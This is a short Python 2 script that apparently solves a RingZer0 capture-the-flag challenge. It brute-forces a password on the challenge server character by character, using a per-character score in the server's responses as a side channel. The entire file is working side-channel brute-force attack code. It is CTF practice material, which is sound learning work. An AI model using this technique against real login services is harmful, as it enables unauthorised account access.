import itertools
import socket

def bruteforce(charset, minlength, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(minlength, maxlength + 1)))

if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("ringzer0team.com",60000))
    #s.sendall("0")
    data = s.recv(9999)
    pad = ""
    currentpwd = ""
    values = map(chr, range(32, 127))
    for i in range(8):
        lowestfloat = 1.0
        lowerletter = ""
        pad = ""
        for zeros in range(7-i):
            pad = pad + "0"
        for password in bruteforce(values,1,1):
            s.sendall(currentpwd + password + pad +"\n")
            data = s.recv(9999)
            try:
                if float(data.split()[4]) < float(lowestfloat):
                    lowestfloat = data.split()[4]
                    lowestletter = password
            except Exception as e:
                pass
        currentpwd = currentpwd + lowestletter
        print currentpwd

    s.close()
    print currentpwd
